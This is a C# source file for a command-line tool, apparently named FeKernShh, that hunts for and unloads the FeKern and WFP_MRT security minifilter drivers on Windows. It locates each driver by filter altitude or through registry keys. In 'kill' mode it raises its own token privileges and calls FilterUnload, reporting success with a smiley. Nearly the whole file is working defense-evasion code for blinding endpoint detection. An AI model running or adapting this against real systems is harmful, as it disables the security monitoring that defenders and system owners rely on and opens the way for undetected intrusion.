using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace FeKernShh
{
    class Program
    {
        private static string execName = AppDomain.CurrentDomain.FriendlyName;
        private static Dictionary<string, int> altitudes = new Dictionary<string, int>();

        static void Main(string[] args)
        {

            if (args.Length < 2)
            {
                Console.WriteLine("[-] Missing args");
                Console.WriteLine("[-] Usage: {0} <hunt|kill> <FeKern|WFP_MRT>", execName);
                Environment.Exit(1);
            }

            if (args[0] == "hunt" || args[0] == "kill")
            {
                if (!IsAdmin())
                {
                    Console.WriteLine("[-] You need administrator permissions to perform this action");
                    Environment.Exit(1);
                }

                if( args[1] == "")
                {
                    Console.WriteLine("[-] ");
                    Environment.Exit(1);
                }

                string drvName = args[1];

                // Definition of filter altitude options
                altitudes.Add("FeKern", 388360);
                altitudes.Add("WFP_MRT", 385860);

                IntPtr currentProcessToken = new IntPtr();

                uint status;
                bool found = false;
                //string drvName = "FeKern"; // or WFP_MRT
                int altitudeNum = altitudes[drvName]; // FeKern == 388360 / WFP_MRT == 385860

                List<FilterParser.FilterInfo> filterInfo = FilterParser.GetFiltersInformation();
                foreach (var filter in filterInfo)
                {
                    if (filter.Altitude.Equals(altitudeNum))
                    {
                        found = true;
                        if (filter.Name.Equals(drvName))
                        {
                            Console.WriteLine("[+] Found the {0} driver running with filter name {1}", drvName, filter.Name);
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                Task<uint> taskKill = Task.Run(() => Win32.FilterUnload(filter.Name));
                                if (taskKill.Wait(TimeSpan.FromSeconds(10)))
                                {
                                    status = taskKill.Result;
                                    if (!status.Equals(0))
                                    {
                                        Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                                        Environment.Exit(1);
                                    }
                                    else
                                    {
                                        Console.WriteLine("[+] {0} was unloaded :)", drvName);
                                        Environment.Exit(0);
                                    }
                                }
                                else
                                {
                                    taskKill.Dispose();
                                    throw new Exception("Timed out");
                                }

                                
                                status = Win32.FilterUnload(filter.Name);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} was unloaded :)", drvName);
                                }

                            }

                        }
                    }
                }

                if (!found)
                {
                    Console.WriteLine("[-] No driver found at altitude {0}. Checking for {1} running at a different altitude.", altitudeNum, drvName);
                    try
                    {
                        FilterParser.WalkRegistryKeys(out string altitude, out string altName, ref drvName);

                        if (!string.IsNullOrWhiteSpace(altName) && !string.IsNullOrWhiteSpace(altitude))
                        {
                            Console.WriteLine("[+] Found {0} running as {1} at altitude {2}", drvName, altName, altitude);
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                Task<uint> taskKill = Task.Run(() => Win32.FilterUnload(altName));
                                if (taskKill.Wait(TimeSpan.FromSeconds(10)))
                                {
                                    status = taskKill.Result;
                                    if (!status.Equals(0))
                                    {
                                        Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                                        Environment.Exit(1);
                                    }
                                    else
                                    {
                                        Console.WriteLine("[+] {0} was unloaded :)", altName);
                                        Environment.Exit(0);
                                    }
                                }
                                else
                                {
                                    taskKill.Dispose();
                                    throw new Exception("Timed out");
                                }

                                
                                status = Win32.FilterUnload(altName);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                                    Environment.Exit(1);
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} was unloaded :)", altName);
                                    Environment.Exit(0);
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("[-] Driver and Regkey not match. Next...");
                        }
                    }
                    catch (System.Security.SecurityException e)
                    {
                        Console.WriteLine("[-] Exception: {0}", e.Message);
                    }
                }
            }
            else
            {
                Console.WriteLine("[-] Incorrect args");
                Console.WriteLine("[-] Usage: {0} <hunt|kill>", execName);
            }
        }

        public static bool IsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                return false;
            }
            return true;
        }
    }
}